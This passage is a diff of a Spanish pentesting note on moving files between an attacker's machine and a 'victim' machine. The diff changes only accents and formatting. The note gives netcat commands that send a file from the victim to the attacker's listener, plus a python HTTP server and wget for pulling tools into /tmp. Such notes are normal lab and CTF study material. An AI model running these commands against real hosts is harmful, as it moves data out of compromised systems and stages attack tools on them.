@@ -7,16 +7,16 @@ tags: [Linux, Transferencia Archivos]
 ---
 ## Maneras de pasar archivos entre máquinas
 
-En máquina víctima recuerda pasarte a un directorio con permiso escritura, tanto en /tmp como en /shm no hay problema.
+En máquina víctima recuerda pasarte a un directorio con permiso de escritura, tanto en `/tmp` como en `/shm` no hay problema.
 
 ---
 
-Para pasar archivo de máquina víctima a la mia:
+Para pasar archivo de máquina víctima a la mía:
 ```  
 > nc -nlvp <puerto> > backup.tgz  
 ```
 Lo anterior en mi máquina.  
-Ahora desde la victima:  
+Ahora desde la víctima:  
 ```
 > nc <miIp> <miPuerto> < <archivo>
 ```
@@ -26,7 +26,7 @@ Me creo servidor
 ```
 > python3 -m http.server <puerto> 
 ```
-Y ya en maquina victima desde  una carpeta con capacidad de escritura(/tmp o /shm por ejemplo):  
+Y ya en máquina víctima desde  una carpeta con capacidad de escritura(/tmp o /shm por ejemplo):  
 ```
 > wget http://<miIp>:<puerto>/<archivo> (si es puerto 80 no hace falta ponerlo).
 ```
@@ -46,7 +46,7 @@ Si quisiera subir al ftp víctima:
 ```
 put  <nameArchivo> (archivo que este en carpeta desde donde me conecté)
 ```
-Y ya la tendríamos sin hacer nada mas.
+Y ya la tendríamos sin hacer nada más.
 
 -----------------
 Si no hubiera ni nc, ni curl, ni wget:  
